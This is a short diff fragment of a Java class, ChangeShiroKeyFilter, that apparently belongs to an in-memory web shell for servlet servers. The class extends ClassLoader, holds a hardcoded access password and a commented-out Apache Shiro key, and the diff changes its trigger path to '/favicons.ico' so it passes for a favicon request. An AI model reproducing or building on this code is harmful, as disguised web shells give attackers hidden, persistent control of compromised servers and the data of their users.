@@ -27,7 +27,7 @@ public class ChangeShiroKeyFilter extends ClassLoader implements Filter {
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
     public String Pwd = "FcoRsBKe9XB3zOHbxTG0Lw==";
-    public String path = "/favicondemo.ico";
+    public String path = "/favicons.ico";
 //    public byte[] key = java.util.Base64.getDecoder().decode(this.Pwd);
     //    public byte[] shirokey = java.util.Base64.getDecoder().decode("3AvVhmFLUs0KTA3Kprsdag==");
 
